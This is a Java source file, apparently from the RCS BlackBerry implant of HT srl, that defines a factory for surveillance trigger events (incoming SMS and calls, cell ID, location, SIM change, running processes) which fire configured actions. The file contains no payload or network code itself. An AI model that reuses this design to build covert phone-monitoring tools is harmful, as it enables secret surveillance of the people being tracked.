/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Event.java
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.event;

import net.rim.device.api.system.Application;

import com.ht.rcs.blackberry.Status;
import com.ht.rcs.blackberry.action.Action;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.StartStopThread;
import com.ht.rcs.blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Event.
 */
public abstract class Event extends StartStopThread {

    /** The debug instance. */
	//#debug
    private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);

    /** The Constant EVENT. */
    public static final int EVENT = 0x2000;

    /** The Constant EVENT_TIMER. */
    public static final int EVENT_TIMER = EVENT + 0x1;

    /** The Constant EVENT_SMS. */
    public static final int EVENT_SMS = EVENT + 0x2;

    /** The Constant EVENT_CALL. */
    public static final int EVENT_CALL = EVENT + 0x3;

    /** The Constant EVENT_CONNECTION. */
    public static final int EVENT_CONNECTION = EVENT + 0x4;

    /** The Constant EVENT_PROCESS. */
    public static final int EVENT_PROCESS = EVENT + 0x5;

    /** The Constant EVENT_CELLID. */
    public static final int EVENT_CELLID = EVENT + 0x6;

    /** The Constant EVENT_QUOTA. */
    public static final int EVENT_QUOTA = EVENT + 0x7;

    /** The Constant EVENT_SIM_CHANGE. */
    public static final int EVENT_SIM_CHANGE = EVENT + 0x8;

    /** The Constant EVENT_LOCATION. */
    public static final int EVENT_LOCATION = EVENT + 0x9;

    /** The Constant EVENT_AC. */
    public static final int EVENT_AC = EVENT + 0xa;

    /** The Constant EVENT_BATTERY. */
    public static final int EVENT_BATTERY = EVENT + 0xb;

    // variables

    /** The Event type. */
    public int eventType = -1;

    /** The Event id. */
    public int eventId = -1;

    /** The Action id. */
    public int actionId = Action.ACTION_UNINIT; // valido, ACTION_NONE, non si
    // rompe.

    /** The status obj. */
    protected Status statusObj = null;

    /**
     * Factory.
     * 
     * @param eventId
     *            the event id
     * @param eventType
     *            the event type
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     * @return the event
     */
    public static synchronized Event factory(int eventId, int eventType,
            int actionId, byte[] confParams) {
        Event event = null;

        switch (eventType) {
        case EVENT_TIMER:
            // #debug
            debug.trace("Factory EVENT_TIMER");
            event = new TimerEvent(actionId, confParams);
            break;
        case EVENT_SMS:
            // #debug
            debug.trace("Factory EVENT_SMS");
            event = new SmsEvent(actionId, confParams);
            break;
        case EVENT_CALL:
            // #debug
            debug.trace("Factory EVENT_CALL");
            event = new CallEvent(actionId, confParams);
            break;
        case EVENT_CONNECTION:
            // #debug
            debug.trace("Factory EVENT_CONNECTION");
            event = new ConnectionEvent(actionId, confParams);
            break;
        case EVENT_PROCESS:
            // #debug
            debug.trace("Factory EVENT_PROCESS");
            event = new ProcessEvent(actionId, confParams);
            break;
        case EVENT_CELLID:
            // #debug
            debug.trace("Factory EVENT_CELLID");
            event = new CellIdEvent(actionId, confParams);
            break;
        case EVENT_QUOTA:
            // #debug
            debug.trace("Factory EVENT_QUOTA");
            event = new QuotaEvent(actionId, confParams);
            break;
        case EVENT_SIM_CHANGE:
            // #debug
            debug.trace("Factory EVENT_SIM_CHANGE");
            event = new SimChangeEvent(actionId, confParams);
            break;
        case EVENT_LOCATION:
            // #debug
            debug.trace("Factory EVENT_LOCATION");
            event = new LocationEvent(actionId, confParams);
            break;
        case EVENT_AC:
            // #debug
            debug.trace("Factory EVENT_AC");
            event = new AcEvent(actionId, confParams);            
            break;
        case EVENT_BATTERY:
            // #debug
            debug.trace("Factory EVENT_BATTERY");
            event = new BatteryEvent(actionId, confParams);
            break;
        default:
            // #debug
            debug.error("Factory Unknown type:" + eventType);
            return null;
        }

        // TODO: mettere dentro i costruttori
        event.eventId = eventId;
        return event;
    }

    /**
     * Instantiates a new event.
     * 
     * @param eventId
     *            the event id
     * @param actionId
     *            the action id
     */
    protected Event(int eventType_, int actionId_, String name) {
        super(name);
        
        this.statusObj = Status.getInstance();

        this.eventType = eventType_;
        this.actionId = actionId_;

        enable(true);
    }

    /**
     * Instantiates a new event.
     * 
     * @param eventId
     *            the event id
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    protected Event(int eventType_, int actionId_, byte[] confParams) {
        this(eventType_, actionId_, "Agent");
        parse(confParams);
    }
    
    /**
     * Parses the.
     * 
     * @param confParams
     *            the conf params
     * @return true, if successful
     */
    protected abstract boolean parse(byte[] confParams);
   
    protected void trigger(){
        // #debug
        debug.trace("event: "+ this +"triggering: " + actionId);
        statusObj.triggerAction(actionId, this);
    }
    
    public String toString() {
        return "Event " + name +":"+ eventType + "|" + eventId;

    }
 
}
